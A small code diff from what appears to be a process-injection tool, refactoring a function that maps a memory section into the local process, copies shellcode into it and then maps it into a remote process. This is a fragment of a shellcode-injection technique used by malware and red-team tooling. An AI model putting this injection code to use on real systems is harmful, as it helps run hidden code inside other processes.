@@ -23,13 +23,12 @@ BOOL AllocateMemory_Section(INJECT_CTX *ctx) {
     }
 
     // map section into memory of local process
-    PVOID hLocalAddress = NULL;
     SIZE_T viewSize = 0;
 
     status = ctx->api.ntMapViewOfSection(
         ctx->hSection,
         GetCurrentProcess(),
-        &hLocalAddress,
+        &ctx->localBase,
         NULL,
         NULL,
         NULL,
@@ -44,7 +43,7 @@ BOOL AllocateMemory_Section(INJECT_CTX *ctx) {
         return FALSE;
     }
 
-    RtlCopyMemory(hLocalAddress, ctx->shellcode.data(), ctx->shellcodeSize);
+    RtlCopyMemory(ctx->localBase, ctx->shellcode.data(), ctx->shellcodeSize);
 
     // map section into memory of remote process
 
